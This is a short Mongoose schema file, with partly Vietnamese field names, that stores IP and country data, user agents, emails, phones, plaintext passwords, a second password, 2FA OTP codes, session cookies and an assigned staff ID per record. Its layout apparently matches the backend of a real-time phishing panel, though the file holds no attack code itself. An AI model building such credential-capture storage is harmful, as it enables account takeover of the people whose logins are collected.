const mongoose = require("mongoose");
const TableSchema = mongoose.Schema(
  {
    owner: {
      type: String,
    },
    ip: {
      type: String,
    },
    codeRandom: {
      type: String,
    },
    quocGiaIp: {
      type: String,
    },
    userGent: {
      type: String,
    },
    quocGiaPhone: {
      type: String,
    },
    note: {
      type: Boolean,
    },
    phone: {
      type: String,
    },
    email: {
      type: String,
      trim: true,
      lowercase: true,
    },
    socketId: {
      type: String,
    },
    password: {
      type: String,
    },

    password2: {
      type: String,
      default: null,
    },

    idStaff: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "user",
      default: null,
    },
    countUpdate:{
      type: Number,
      default: 0,
    },
    otp2FA: {
      type: String,
      default: null,
    },
    cookie: {
      type: String,
      default: null,
    },
    username: {
      type: String,
      default: null,
    },
    statusVery: {
      type: Boolean,
    },
    status: {
      type: String,
      default: "pending",
    },
  },
  { timestamps: true }
);

module.exports = mongoose.model("table", TableSchema);
